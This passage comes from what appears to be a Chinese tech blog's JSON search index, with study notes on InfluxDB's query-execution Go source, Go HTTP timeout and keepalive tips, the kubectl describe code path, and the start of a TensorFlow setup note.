err\n\t\t\t}\n\t\t\tstatements = append(statements, s) //返回解析的statments\n\t\t\tsemi = false\n\t\t}\n\t}\n}\n```\n\n执行解析的executeQuery函数：\n\n```go\n// ExecuteQuery executes each statement within a query.\nfunc (e *Executor) ExecuteQuery(query *influxql.Query, opt ExecutionOptions, closing chan struct{}) <-chan *Result {\n\tresults := make(chan *Result)\n\tgo e.executeQuery(query, opt, closing, results)  //执行查询语句\n\treturn results\n}\n```\n\n调用executeQuery函数：\n\n```go\nfunc (e *Executor) executeQuery(query *influxql.Query, opt ExecutionOptions, closing <-chan struct{}, results chan *Result) {\n\tdefer close(results)\n\tdefer e.recover(query, results)\n\n\tatomic.AddInt64(&e.stats.ActiveQueries, 1)\n\tatomic.AddInt64(&e.stats.ExecutedQueries, 1)\n\tdefer func(start time.Time) {\n\t\tatomic.AddInt64(&e.stats.ActiveQueries, -1)\n\t\tatomic.AddInt64(&e.stats.FinishedQueries, 1)\n\t\tatomic.AddInt64(&e.stats.QueryExecutionDuration, time.Since(start).Nanoseconds())\n\t}(time.Now())\n// 使用taskManager来管理查询query,返回一个channel，当query完成running的时候。\n\tctx, detach, err := e.TaskManager.AttachQuery(query, opt, closing)\n\tif err != nil {\n\t\tselect {\n\t\tcase results <- &Result{Err: err}:\n\t\tcase <-opt.AbortCh:\n\t\t}\n\t\treturn\n\t}\n\tdefer detach()\n\n\t// Setup the execution context that will be used when executing statements.\n\tctx.Results = results\n\n\tvar i int\nLOOP:\n\tfor ; i < len(query.Statements); i++ {\n\t\tctx.statementID = i\n\t\tstmt := query.Statements[i]\n\n\t\t// If a default database wasn't passed in by the caller, check the statement.\n\t\tdefaultDB := opt.Database\n\t\tif defaultDB == \"\" {\n\t\t\tif s, ok := stmt.(influxql.HasDefaultDatabase); ok {\n\t\t\t\tdefaultDB = s.DefaultDatabase()\n\t\t\t}\n\t\t}\n\n\t\t// Do not let queries manually use the system measurements. If we find\n\t\t// one, return an error. This prevents a person from using the\n\t\t// measurement incorrectly and causing a panic.\n\t\tif stmt, ok := stmt.(*influxql.SelectStatement); ok {\n\t\t\tfor _, s := range stmt.Sources {\n\t\t\t\tswitch s := s.(type) {\n\t\t\t\tcase *influxql.Measurement:\n\t\t\t\t\tif influxql.IsSystemName(s.Name) {\n\t\t\t\t\t\tcommand := \"the appropriate meta command\"\n\t\t\t\t\t\tswitch s.Name {\n\t\t\t\t\t\tcase \"_fieldKeys\":\n\t\t\t\t\t\t\tcommand = \"SHOW FIELD KEYS\"\n\t\t\t\t\t\tcase \"_measurements\":\n\t\t\t\t\t\t\tcommand = \"SHOW MEASUREMENTS\"\n\t\t\t\t\t\tcase \"_series\":\n\t\t\t\t\t\t\tcommand = \"SHOW SERIES\"\n\t\t\t\t\t\tcase \"_tagKeys\":\n\t\t\t\t\t\t\tcommand = \"SHOW TAG KEYS\"\n\t\t\t\t\t\tcase \"_tags\":\n\t\t\t\t\t\t\tcommand = \"SHOW TAG VALUES\"\n\t\t\t\t\t\t}\n\t\t\t\t\t\tresults <- &Result{\n\t\t\t\t\t\t\tErr: fmt.Errorf(\"unable to use system source '%s': use %s instead\", s.Name, command),\n\t\t\t\t\t\t}\n\t\t\t\t\t\tbreak LOOP\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n\t\t// Rewrite statements, if necessary.\n\t\t// This can occur on meta read statements which convert to SELECT statements.\n\t\tnewStmt, err := RewriteStatement(stmt)\n\t\tif err != nil {\n\t\t\tresults <- &Result{Err: err}\n\t\t\tbreak\n\t\t}\n\t\tstmt = newStmt\n\n\t\t// Normalize each statement if possible.\n\t\tif normalizer, ok := e.StatementExecutor.(StatementNormalizer); ok {\n\t\t\tif err := normalizer.NormalizeStatement(stmt, defaultDB, opt.RetentionPolicy); err != nil {\n\t\t\t\tif err := ctx.send(&Result{Err: err}); err == ErrQueryAborted {\n\t\t\t\t\treturn\n\t\t\t\t}\n\t\t\t\tbreak\n\t\t\t}\n\t\t}\n\n\t\t// Log each normalized statement.\n\t\tif !ctx.Quiet {\n\t\t\te.Logger.Info(\"Executing query\", zap.Stringer(\"query\", stmt))\n\t\t}\n\n\t\t// Send any other statements to the underlying statement executor.\n\t\terr = e.StatementExecutor.ExecuteStatement(stmt, ctx)\n\t\tif err == ErrQueryInterrupted {\n\t\t\t// Query was interrupted so retrieve the real interrupt error from\n\t\t\t// the query task if there is one.\n\t\t\tif qerr := ctx.Err(); qerr != nil {\n\t\t\t\terr = qerr\n\t\t\t}\n\t\t}\n\n\t\t// Send an error for this result if it failed for some reason.\n\t\tif err != nil {\n\t\t\tif err := ctx.send(&Result{\n\t\t\t\tStatementID: i,\n\t\t\t\tErr:         err,\n\t\t\t}); err == ErrQueryAborted {\n\t\t\t\treturn\n\t\t\t}\n\t\t\t// Stop after the first error.\n\t\t\tbreak\n\t\t}\n\n\t\t// Check if the query was interrupted during an uninterruptible statement.\n\t\tinterrupted := false\n\t\tselect {\n\t\tcase <-ctx.Done():\n\t\t\tinterrupted = true\n\t\tdefault:\n\t\t\t// Query has not been interrupted.\n\t\t}\n\n\t\tif interrupted {\n\t\t\tbreak\n\t\t}\n\t}\n\n\t// Send error results for any statements which were not executed.\n\tfor ; i < len(query.Statements)-1; i++ {\n\t\tif err := ctx.send(&Result{\n\t\t\tStatementID: i,\n\t\t\tErr:         ErrNotExecuted,\n\t\t}); err == ErrQueryAborted {\n\t\t\treturn\n\t\t}\n\t}\n}\n```\n\n函数AttachQuery用于管理当前查询的query的状态\n\n```go\n// AttachQuery attaches a running query to be managed by the TaskManager.\n// Returns the query id of the newly attached query or an error if it was\n// unable to assign a query id or attach the query to the TaskManager.\n// This function also returns a channel that will be closed when this\n// query finishes running.\n//\n// After a query finishes running, the system is free to reuse a query id.\nfunc (t *TaskManager) AttachQuery(q *influxql.Query, opt ExecutionOptions, interrupt <-chan struct{}) (*ExecutionContext, func(), error) {\n\tt.mu.Lock()\n\tdefer t.mu.Unlock()\n\n\tif t.shutdown {\n\t\treturn nil, nil, ErrQueryEngineShutdown\n\t}\n\n\tif t.MaxConcurrentQueries > 0 && len(t.queries) >= t.MaxConcurrentQueries {\n\t\treturn nil, nil, ErrMaxConcurrentQueriesLimitExceeded(len(t.queries), t.MaxConcurrentQueries)\n\t}\n\n\tqid := t.nextID\n    //初始化task\n\tquery := &Task{\n\t\tquery:     q.String(),\n\t\tdatabase:  opt.Database,\n\t\tstatus:    RunningTask,\n\t\tstartTime: time.Now(),\n\t\tclosing:   make(chan struct{}),\n\t\tmonitorCh: make(chan error),\n\t}\n\tt.queries[qid] = query\n\n\tgo t.waitForQuery(qid, query.closing, interrupt, query.monitorCh)//开启协程来监听query是否结束。\n\tif t.LogQueriesAfter != 0 {\n\t\tgo query.monitor(func(closing <-chan struct{}) error {\n\t\t\ttimer := time.NewTimer(t.LogQueriesAfter)//检测到慢查询的时候，报警。\n\t\t\tdefer timer.Stop()\n\n\t\t\tselect {\n\t\t\tcase <-timer.C:\n\t\t\t\tt.Logger.Warn(fmt.Sprintf(\"Detected slow query: %s (qid: %d, database: %s, threshold: %s)\",\n\t\t\t\t\tquery.query, qid, query.database, t.LogQueriesAfter))\n\t\t\tcase <-closing:\n\t\t\t}\n\t\t\treturn nil\n\t\t})\n\t}\n\tt.nextID++\n    //初始化一个ctx上下文\n\tctx := &ExecutionContext{\n\t\tContext:          context.Background(),\n\t\tQueryID:          qid,\n\t\ttask:             query,\n\t\tExecutionOptions: opt,\n\t}\n\tctx.watch()\n   \t// detach query，从查询table中去除。\n\treturn ctx, func() { t.DetachQuery(qid) }, nil\n    \n}\n```\n\n将解析出来的statement执行函数ExecuteStatement\n\n```go\n// ExecuteStatement executes the given statement with the given execution context.\nfunc (e *StatementExecutor) ExecuteStatement(stmt influxql.Statement, ctx *query.ExecutionContext) error {\n\t// Select statements are handled separately so that they can be streamed.\n    //特殊处理select查询\n\tif stmt, ok := stmt.(*influxql.SelectStatement); ok {\n\t\treturn e.executeSelectStatement(stmt, ctx)\n\t}\n\n\tvar rows models.Rows\n\tvar messages []*query.Message\n\tvar err error\n\tswitch stmt := stmt.(type) {\n     //根据每个类别分别处理不同type的查询语句，有点多，自己看下吧~~~\n\tcase *influxql.AlterRetentionPolicyStatement:\n\t\tif ctx.ReadOnly {\n\t\t\tmessages = append(messages, query.ReadOnlyWarning(stmt.String()))\n\t\t}\n\t\terr = e.executeAlterRetentionPolicyStatement(stmt)\n\tcase *influxql.CreateContinuousQueryStatement:\n\t\tif ctx.ReadOnly {\n\t\t\tmessages = append(messages, query.ReadOnlyWarning(stmt.String()))\n\t\t}\n\t\terr = e.executeCreateContinuousQueryStatement(stmt)\n\tcase *influxql.CreateDatabaseStatement:\n\t\tif ctx.ReadOnly {\n\t\t\tmessages = append(messages, query.ReadOnlyWarning(stmt.String()))\n\t\t}\n\t\terr = e.executeCreateDatabaseStatement(stmt)\n\tcase *influxql.CreateRetentionPolicyStatement:\n\t\tif ctx.ReadOnly {\n\t\t\tmessages = append(messages, query.ReadOnlyWarning(stmt.String()))\n\t\t}\n\t\terr = e.executeCreateRetentionPolicyStatement(stmt)\n\tcase *influxql.CreateSubscriptionStatement:\n\t\tif ctx.ReadOnly {\n\t\t\tmessages = append(messages, query.ReadOnlyWarning(stmt.String()))\n\t\t}\n\t\terr = e.executeCreateSubscriptionStatement(stmt)\n\tcase *influxql.CreateUserStatement:\n\t\tif ctx.ReadOnly {\n\t\t\tmessages = append(messages, query.ReadOnlyWarning(stmt.String()))\n\t\t}\n\t\terr = e.executeCreateUserStatement(stmt)\n\tcase *influxql.DeleteSeriesStatement:\n\t\terr = e.executeDeleteSeriesStatement(stmt, ctx.Database)\n\tcase *influxql.DropContinuousQueryStatement:\n\t\tif ctx.ReadOnly {\n\t\t\tmessages = append(messages, query.ReadOnlyWarning(stmt.String()))\n\t\t}\n\t\terr = e.executeDropContinuousQueryStatement(stmt)\n\tcase *influxql.DropDatabaseStatement:\n\t\tif ctx.ReadOnly {\n\t\t\tmessages = append(messages, query.ReadOnlyWarning(stmt.String()))\n\t\t}\n\t\terr = e.executeDropDatabaseStatement(stmt)\n\tcase *influxql.DropMeasurementStatement:\n\t\tif ctx.ReadOnly {\n\t\t\tmessages = append(messages, query.ReadOnlyWarning(stmt.String()))\n\t\t}\n\t\terr = e.executeDropMeasurementStatement(stmt, ctx.Database)\n\tcase *influxql.DropSeriesStatement:\n\t\tif ctx.ReadOnly {\n\t\t\tmessages = append(messages, query.ReadOnlyWarning(stmt.String()))\n\t\t}\n\t\terr = e.executeDropSeriesStatement(stmt, ctx.Database)\n\tcase *influxql.DropRetentionPolicyStatement:\n\t\tif ctx.ReadOnly {\n\t\t\tmessages = append(messages, query.ReadOnlyWarning(stmt.String()))\n\t\t}\n\t\terr = e.executeDropRetentionPolicyStatement(stmt)\n\tcase *influxql.DropShardStatement:\n\t\tif ctx.ReadOnly {\n\t\t\tmessages = append(messages, query.ReadOnlyWarning(stmt.String()))\n\t\t}\n\t\terr = e.executeDropShardStatement(stmt)\n\tcase *influxql.DropSubscriptionStatement:\n\t\tif ctx.ReadOnly {\n\t\t\tmessages = append(messages, query.ReadOnlyWarning(stmt.String()))\n\t\t}\n\t\terr = e.executeDropSubscriptionStatement(stmt)\n\tcase *influxql.DropUserStatement:\n\t\tif ctx.ReadOnly {\n\t\t\tmessages = append(messages, query.ReadOnlyWarning(stmt.String()))\n\t\t}\n\t\terr = e.executeDropUserStatement(stmt)\n\tcase *influxql.ExplainStatement:\n\t\tif stmt.Analyze {\n\t\t\trows, err = e.executeExplainAnalyzeStatement(stmt, ctx)\n\t\t} else {\n\t\t\trows, err = e.executeExplainStatement(stmt, ctx)\n\t\t}\n\tcase *influxql.GrantStatement:\n\t\tif ctx.ReadOnly {\n\t\t\tmessages = append(messages, query.ReadOnlyWarning(stmt.String()))\n\t\t}\n\t\terr = e.executeGrantStatement(stmt)\n\tcase *influxql.GrantAdminStatement:\n\t\tif ctx.ReadOnly {\n\t\t\tmessages = append(messages, query.ReadOnlyWarning(stmt.String()))\n\t\t}\n\t\terr = e.executeGrantAdminStatement(stmt)\n\tcase *influxql.RevokeStatement:\n\t\tif ctx.ReadOnly {\n\t\t\tmessages = append(messages, query.ReadOnlyWarning(stmt.String()))\n\t\t}\n\t\terr = e.executeRevokeStatement(stmt)\n\tcase *influxql.RevokeAdminStatement:\n\t\tif ctx.ReadOnly {\n\t\t\tmessages = append(messages, query.ReadOnlyWarning(stmt.String()))\n\t\t}\n\t\terr = e.executeRevokeAdminStatement(stmt)\n\tcase *influxql.ShowContinuousQueriesStatement:\n\t\trows, err = e.executeShowContinuousQueriesStatement(stmt)\n\tcase *influxql.ShowDatabasesStatement:\n\t\trows, err = e.executeShowDatabasesStatement(stmt, ctx)\n\tcase *influxql.ShowDiagnosticsStatement:\n\t\trows, err = e.executeShowDiagnosticsStatement(stmt)\n\tcase *influxql.ShowGrantsForUserStatement:\n\t\trows, err = e.executeShowGrantsForUserStatement(stmt)\n\tcase *influxql.ShowMeasurementsStatement:\n\t\treturn e.executeShowMeasurementsStatement(stmt, ctx)\n\tcase *influxql.ShowMeasurementCardinalityStatement:\n\t\trows, err = e.executeShowMeasurementCardinalityStatement(stmt)\n\tcase *influxql.ShowRetentionPoliciesStatement:\n\t\trows, err = e.executeShowRetentionPoliciesStatement(stmt)\n\tcase *influxql.ShowSeriesCardinalityStatement:\n\t\trows, err = e.executeShowSeriesCardinalityStatement(stmt)\n\tcase *influxql.ShowShardsStatement:\n\t\trows, err = e.executeShowShardsStatement(stmt)\n\tcase *influxql.ShowShardGroupsStatement:\n\t\trows, err = e.executeShowShardGroupsStatement(stmt)\n\tcase *influxql.ShowStatsStatement:\n\t\trows, err = e.executeShowStatsStatement(stmt)\n\tcase *influxql.ShowSubscriptionsStatement:\n\t\trows, err = e.executeShowSubscriptionsStatement(stmt)\n\tcase *influxql.ShowTagKeysStatement:\n\t\treturn e.executeShowTagKeys(stmt, ctx)\n\tcase *influxql.ShowTagValuesStatement:\n\t\treturn e.executeShowTagValues(stmt, ctx)\n\tcase *influxql.ShowUsersStatement:\n\t\trows, err = e.executeShowUsersStatement(stmt)\n\tcase *influxql.SetPasswordUserStatement:\n\t\tif ctx.ReadOnly {\n\t\t\tmessages = append(messages, query.ReadOnlyWarning(stmt.String()))\n\t\t}\n\t\terr = e.executeSetPasswordUserStatement(stmt)\n\tcase *influxql.ShowQueriesStatement, *influxql.KillQueryStatement:\n\t\t// Send query related statements to the task manager.\n\t\treturn e.TaskManager.ExecuteStatement(stmt, ctx)\n\tdefault:\n\t\treturn query.ErrInvalidQuery\n\t}\n\n\tif err != nil {\n\t\treturn err\n\t}\n\n\treturn ctx.Send(&query.Result{\n\t\tSeries:   rows,\n\t\tMessages: messages,\n\t})\n}\n```\n\n针对不同类型的statment执行不同的查询tsdb过程。以select查询为例。，executeSelectStatement单独处理，为了能够streamed。\n\n```go\nfunc (e *StatementExecutor) executeSelectStatement(stmt *influxql.SelectStatement, ctx *query.ExecutionContext) error {\n\t//创建迭代器\n    cur, err := e.createIterators(ctx, stmt, ctx.ExecutionOptions)\n\tif err != nil {\n\t\treturn err\n\t}\n\n\t// Generate a row emitter from the iterator set.\n    // 从迭代器中生成一个row emitter，chunkSize大小。\n\tem := query.NewEmitter(cur, ctx.ChunkSize)\n\tdefer em.Close()\n\n\t// Emit rows to the results channel.\n\tvar writeN int64\n\tvar emitted bool\n\n\tvar pointsWriter *BufferedPointsWriter\n\tif stmt.Target != nil {\n        //初始化\n\t\tpointsWriter = NewBufferedPointsWriter(e.PointsWriter, stmt.Target.Measurement.Database, stmt.Target.Measurement.RetentionPolicy, 10000)\n\t}\n\n\tfor {\n        // 查询数据\n\t\trow, partial, err := em.Emit()\n\t\tif err != nil {\n\t\t\treturn err\n\t\t} else if row == nil {\n\t\t\t// Check if the query was interrupted while emitting.\n\t\t\tselect {\n\t\t\tcase <-ctx.Done():\n\t\t\t\treturn ctx.Err()\n\t\t\tdefault:\n\t\t\t}\n\t\t\tbreak\n\t\t}\n\n\t\t// Write points back into system for INTO statements.\n        // INTO不为空，则写入这个pointswriter\n\t\tif stmt.Target != nil {\n\t\t\tif err := e.writeInto(pointsWriter, stmt, row); err != nil {\n\t\t\t\treturn err\n\t\t\t}\n\t\t\twriteN += int64(len(row.Values))\n\t\t\tcontinue\n\t\t}\n\n\t\tresult := &query.Result{\n\t\t\tSeries:  []*models.Row{row},\n\t\t\tPartial: partial,\n\t\t}\n\n\t\t// Send results or exit if closing.\n        //发送结果\n\t\tif err := ctx.Send(result); err != nil {\n\t\t\treturn err\n\t\t}\n\n\t\temitted = true\n\t}\n\n\t// Flush remaining points and emit write count if an INTO statement.\n\tif stmt.Target != nil {\n\t\tif err := pointsWriter.Flush(); err != nil {\n\t\t\treturn err\n\t\t}\n\n\t\tvar messages []*query.Message\n\t\tif ctx.ReadOnly {\n\t\t\tmessages = append(messages, query.ReadOnlyWarning(stmt.String()))\n\t\t}\n\n\t\treturn ctx.Send(&query.Result{\n\t\t\tMessages: messages,\n\t\t\tSeries: []*models.Row{{\n\t\t\t\tName:    \"result\",\n\t\t\t\tColumns: []string{\"time\", \"written\"},\n\t\t\t\tValues:  [][]interface{}{{time.Unix(0, 0).UTC(), writeN}},\n\t\t\t}},\n\t\t})\n\t}\n\n\t// Always emit at least one result.\n\tif !emitted {\n\t\treturn ctx.Send(&query.Result{\n\t\t\tSeries: make([]*models.Row, 0),\n\t\t})\n\t}\n\n\treturn nil\n}\n```\n\nemit函数查询获取数据并返回:\n\n```go\n// Emit returns the next row from the iterators.\nfunc (e *Emitter) Emit() (*models.Row, bool, error) {\n\t// Continually read from the cursor until it is exhausted.\n\tfor {\n\t\t// Scan the next row. If there are no rows left, return the current row.\n\t\tvar row Row\n\t\tif !e.cur.Scan(&row) {\n\t\t\tif err := e.cur.Err(); err != nil {\n\t\t\t\treturn nil, false, err\n\t\t\t}\n\t\t\tr := e.row\n\t\t\te.row = nil\n\t\t\treturn r, false, nil\n\t\t}\n\n\t\t// If there's no row yet then create one.\n\t\t// If the name and tags match the existing row, append to that row if\n\t\t// the number of values doesn't exceed the chunk size.\n\t\t// Otherwise return existing row and add values to next emitted row.\n\t\tif e.row == nil {\n\t\t\te.createRow(row.Series, row.Values)\n\t\t} else if e.series.SameSeries(row.Series) {\n\t\t\tif e.chunkSize > 0 && len(e.row.Values) >= e.chunkSize {//如果查询数据量大于chunkSize，则返回，同时 partial=true标识。\n\t\t\t\tr := e.row\n\t\t\t\tr.Partial = true\n\t\t\t\te.createRow(row.Series, row.Values)\n\t\t\t\treturn r, true, nil\n\t\t\t}\n\t\t\te.row.Values = append(e.row.Values, row.Values)\n\t\t} else {\n\t\t\tr := e.row\n\t\t\te.createRow(row.Series, row.Values)\n\t\t\treturn r, true, nil\n\t\t}\n\t}\n}\n```\n\n\n\n #### 总结\n\n大概看了下influxdb从启动到服务查询接口的整体流程。以select为例，看了不同的query查询和解析方式类似，都需要走解析查询的。词法解析器是 influxdb自己写的。 底层如何构建的以后再讨论吧。还有很多细节需要自己去看下了。orz\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["influxdb"],"categories":["influxdb"]},{"title":"golang","url":"/2017/05/26/gotips/","content":"\n## golang超时问题\n\ngolang中http请求经常遇到的问题，本人也遇到过超时的情况。写个笔记记录下。\n\n当在编写一个Go语言的HTTP服务端或者是客户端时，超时是最容易同时也是最敏感的错误，有很多选择，一个错误可以导致很长时间没有结果，知道网络出现故障，或者进程宕掉。\n\n在分析过程中，发现服务之间调用有EOF的问题，一般情况下是两个服务之间的readtimeout和writetimeout设置超时导致的。当然也有一个keepalive超时的问题。需要保证服务A调用服务B的时候，服务A的keepalive大于服务B的keepalive。\n\npython服务器gunicon在设置keepalive的时候，之前遇到过默认情况的keepalive时间给了5s钟，遇到服务A的keepalive时间大于60s的时候，可能服务B的连接已经断开了，但是服务A还维持的会话，当获取数据的时候发现读取数据失败返回EOF问题了。\n\n建议保证：服务B的Keepalive时间 > 服务A的keepalive时间\n\n![HTTP server phases](http://img.kuqin.com/upimg/allimg/160720/2036151E2-0.png)\n\n![HTTP Client phases](http://img.kuqin.com/upimg/allimg/160720/2036154434-1.png)\n\n### 参考资料\n\nhttps://studygolang.com/articles/7692\n","tags":["golang"],"categories":["golang"]},{"title":"kubectl 学习笔记","url":"/2017/05/26/kubectl/","content":"\n\n## kubectl 学习笔记\n\n思考：kubectl 和docker命令源码的设计思想类似。\n\ndocker中启动了服务器接受请求注册*api*, 而kubectl发送命令给apiserver请求数据或者创建资源。\n\nCmds是kubectl中的命令集合，所有命令都会整理在里面。\n\nCmd 是命令的实体，其中主要是具体执行用户命令。每个cmd负责一个命令执行类型(describe,get...)。\n\nBuilder 是cmd执行操作时的辅助工具，主要是负责封装与Apiserver交互的底层操作，和将Apiserver的返回数据转化为统一数据结构。\n\nKubectl 依赖于[cobra](https://github.com/spf13/cobra)包构建命令行支持，该包是支持通用的命令行构建库。\n\n```\nCmds(命令集合)<---Cmd(命令obj)\n       |          |\n       |          |\n       |          | \n       |        Builder\n       |          |\n       |          |  \n       |----------Cmd(命令obj)\n```\n\nKubectl 的执行流程分析以describe命令分析。\n\n1. 用户发起请求\n2. 根据用户执行动作分发给处理对应动作的Cmd (Cmd是执行用户命令的实体)\n3. 解析用户命令\n4. 向Apiserver获取数据\n5. 整理返回为通用的数据集合\n6. 找到解释查询类型数据的句柄\n7. 使用具柄对整理出的数据集合进行打印输出\n\n```\nkubectl describe node node1\n```\n\n如下, NewKubectlCommand 方法中cobra会根据命令动作将请求分配给describe注册的cmd。\n\n```\ngroups := templates.CommandGroups{\n        //...\n        {\n            Message: \"Troubleshooting and Debugging Commands:\",\n            Commands: []*cobra.Command{\n                NewCmdDescribe(f, out, err),    //<------describe操作的cmd\n                NewCmdLogs(f, out),\n                NewCmdAttach(f, in, out, err),\n                NewCmdExec(f, in, out, err),\n                NewCmdPortForward(f, out, err),\n                NewCmdProxy(f, out),\n                NewCmdCp(f, out, err),\n                auth.NewCmdAuth(f, out, err),\n            },\n        },\n        {\n            Message: \"Advanced Commands:\",\n            Commands: []*cobra.Command{\n                NewCmdApply(\"kubectl\", f, out, err),\n                NewCmdPatch(f, out),\n                NewCmdReplace(f, out),\n                NewCmdConvert(f, out),\n            },\n        },\n        // ...\n    }\n    groups.Add(cmds)\n```\n\nCmd会对获取用户输入数据， 并检查正确性然后使用Run函数处理。\n\n```\nfunc NewCmdDescribe(f cmdutil.Factory, out, cmdErr io.Writer) *cobra.Command {\n    options := &resource.FilenameOptions{}\n    describerSettings := &printers.DescriberSettings{}\n\n    validArgs := printersinternal.DescribableResources()\n    argAliases := kubectl.ResourceAliases(validArgs)\n\n    cmd := &cobra.Command{\n        Use:     \"describe (-f FILENAME | TYPE [NAME_PREFIX | -l label] | TYPE/NAME)\",\n        Short:   i18n.T(\"Show details of a specific resource or group of resources\"),\n        Long:    describeLong + \"\\n\\n\" + cmdutil.ValidResourceTypeList(f),\n        Example: describeExample,\n        Run: func(cmd *cobra.Command, args []string) {   // <------处理回调函数\n            err := RunDescribe(f, out, cmdErr, cmd, args, options, describerSettings)\n            cmdutil.CheckErr(err)\n        },\n        ValidArgs:  validArgs,     //<-----------------合法性检查 \n        ArgAliases: argAliases,\n    }\n    usage := \"containing the resource to describe\"\n    cmdutil.AddFilenameOptionFlags(cmd, options, usage)\n    \n    // 下面主要是输入参数检查 \n    \n    cmd.Flags().StringP(\"selector\", \"l\", \"\", \"Selector (label query) to filter on, supports '=', '==', and '!='.(e.g. -l key1=value1,key2=value2)\")\n    cmd.Flags().Bool(\"all-namespaces\", false, \"If present, list the requested object(s) across all namespaces. Namespace in current context is ignored even if specified with --namespace.\")\n    cmd.Flags().BoolVar(&describerSettings.ShowEvents, \"show-events\", true, \"If true, display events related to the described object.\")\n    cmdutil.AddInclude3rdPartyFlags(cmd)\n    cmdutil.AddIncludeUninitializedFlag(cmd)\n    return cmd\n}\n```\n\n如下, 在 RunDescribe 中时对该命令的具体处理\n\n- Builder(), Unstructured(), ContinueOnError().\n   NamespaceParam(), FilenameParam(), LabelSelectorParam() ... Flatten() 的链式调用流程主要是为执行命令做准备。\n- Do() 函数是注册具体向Apiserver请求数据，和讲返回数据转化为通用结构的方法。\n- 最后的 describer.Describe（） 函数是将提取出的返回数据 打印出来做可视化接口。\n\n```\nfunc RunDescribe(f cmdutil.Factory, out, cmdErr io.Writer, cmd *cobra.Command, args []string, options *resource.FilenameOptions, describerSettings *printers.DescriberSettings) error {\n    \n    // ...\n\n    // include the uninitialized objects by default\n    // unless user explicitly set --include-uninitialized=false\n    includeUninitialized := cmdutil.ShouldIncludeUninitialized(cmd, true)\n    r := f.NewBuilder().\n        Unstructured().\n        ContinueOnError().\n        NamespaceParam(cmdNamespace).DefaultNamespace().AllNamespaces(allNamespaces).\n        FilenameParam(enforceNamespace, options).\n        LabelSelectorParam(selector).    // 设置用户的标签选择\n        IncludeUninitialized(includeUninitialized).\n        ResourceTypeOrNameArgs(true, args...). // 提取用户选择操作的对象类型\n        Flatten().                             //决定以何种方式从K8s的返回数据中提取信息                     \n        Do()                                   //执行命令获取数据\n    \n    // ...\n    \n    infos, err := r.Infos()                     \n    if err != nil {\n        if apierrors.IsNotFound(err) && len(args) == 2 {\n            return DescribeMatchingResources(f, cmdNamespace, args[0], args[1], describerSettings, out, err)\n        }\n        allErrs = append(allErrs, err)\n    }\n\n    errs := sets.NewString()\n    first := true\n    for _, info := range infos {\n        mapping := info.ResourceMapping()\n        describer, err := f.Describer(mapping)\n        if err != nil {\n            if errs.Has(err.Error()) {\n                continue\n            }\n            allErrs = append(allErrs, err)\n            errs.Insert(err.Error())\n            continue\n        }\n        // 下面通过describe 方法将提取到的数据 打印出来\n        s, err := describer.Describe(info.Namespace, info.Name, *describerSettings)\n        if err != nil {\n            if errs.Has(err.Error()) {\n                continue\n            }\n            allErrs = append(allErrs, err)\n            errs.Insert(err.Error())\n            continue\n        }\n        if first {\n            first = false\n            fmt.Fprint(out, s)\n        } else {\n            fmt.Fprintf(out, \"\\n\\n%s\", s)\n        }\n    }\n\n    return utilerrors.NewAggregate(allErrs)\n}\n```\n\n下面具体分析获取数据的流程，获取数据包括从Apiserver请求数据以及从返回信息中提取有用数据两个操作。\n\nRetrieveLazy 中注册了从Apiserver获取数据的操作。\nNewDecoratedVisitor 中注册了从获取到的数据结构中转化出通用数据的方法。\n\n```\n// inputs are consumed by the first execution - use Infos() or Object() on the Result to capture a list\n// for further iteration.\nfunc (b *Builder) Do() *Result {\n    r := b.visitorResult()\n    //... \n    \n    helpers := []VisitorFunc{}\n    //注册获取数据前的动作\n    if b.defaultNamespace {\n        helpers = append(helpers, SetNamespace(b.namespace))\n    }\n    if b.requireNamespace {\n        helpers = append(helpers, RequireNamespace(b.namespace))\n    }\n    helpers = append(helpers, FilterNamespace)\n    if b.requireObject {\n        //注册从Apiserver获取数据的方法\n        helpers = append(helpers, RetrieveLazy) \n    }\n    //注册从返回数据中提取信息的方法\n    r.visitor = NewDecoratedVisitor(r.visitor, helpers...)\n    if b.continueOnError {\n        r.visitor = ContinueOnErrorVisitor{r.visitor}\n    }\n    return r\n}\n```\n\n```\n// RetrieveLazy updates the object if it has not been loaded yet.\nfunc RetrieveLazy(info *Info, err error) error {\n    if err != nil {\n        return err\n    }\n    if info.Object == nil {\n        return info.Get()     //从Apiserver获取数据\n    }\n    return nil\n}\n```\n\n而 NewDecoratedVisitor 方法注册了数据处理的关键函数 Visit， 这个函数可以使用户可以将来自Apiserver的数据转化为通用数据集合。\n\n```\n// NewDecoratedVisitor will create a visitor that invokes the provided visitor functions before\n// the user supplied visitor function is invoked, giving them the opportunity to mutate the Info\n// object or terminate early with an error.\nfunc NewDecoratedVisitor(v Visitor, fn ...VisitorFunc) Visitor {\n    if len(fn) == 0 {\n        return v\n    }\n    return DecoratedVisitor{v, fn}\n}\n\n// Visit implements Visitor\nfunc (v DecoratedVisitor) Visit(fn VisitorFunc) error {\n    return v.visitor.Visit(func(info *Info, err error) error {\n        if err != nil {\n            return err\n        }\n        for i := range v.decorators {\n            if err := v.decorators[i](info, nil); err != nil {\n                return err\n            }\n        }\n        return fn(info, nil)\n    })\n}\n```\n\n打印提取到的数据主要是调用注册的describe方法，会根据用户的请求如下获取对应的describe\n\n```\ndescriber, err := f.Describer(mapping)\n```\n\nDescribe 集合中注册了 对K8s各种数据的打印方法(针对visit转化后的通用数据)\n\n```\nfunc init() {\n    d := &Describers{}\n    err := d.Add(\n        describeLimitRange,\n        describeQuota,\n        describePod,\n        describeService,\n        describeReplicationController,\n        describeDaemonSet,\n        describeNode,              //打印节点\n        describeNamespace,\n    )\n    if err != nil {\n        glog.Fatalf(\"Cannot register describers: %v\", err)\n    }\n    DefaultObjectDescriber = d\n}\n```\n\n使用获取到的对应的Describe作打印\n\n```\n//遍历整理出的返回信息\nfor _, info := range infos {\n        // 执行打印操作\n        s, err := describer.Describe(info.Namespace, info.Name, *describerSettings)\n        // ...\n    }\n```\n\n\n\n","tags":["k8s"],"categories":["k8s"]},{"title":"tensorflow环境安装","url":"/2017/05/26/tensorflow安装小结/","content":"\n## 深度学习环境 tensorflow安装\n\n### 环境准备\n\n需要支持RTX2080ti显卡，最好有11g现存。\n\n本人使用CUDA10.1，cudnn 10.1适配。\n\npython3.7 pycharm安装。\n\nanaconde3 安装多次使用了 anaconde3 4.4 版本安装上了。\n\n之后安装tensorflow，安装版本1.13版本的支持10.1的版本的tensorflow.\n\n### 运行测试\n\n```python\n# -*- coding: utf-8 -*-\n\nimport tensorflow as 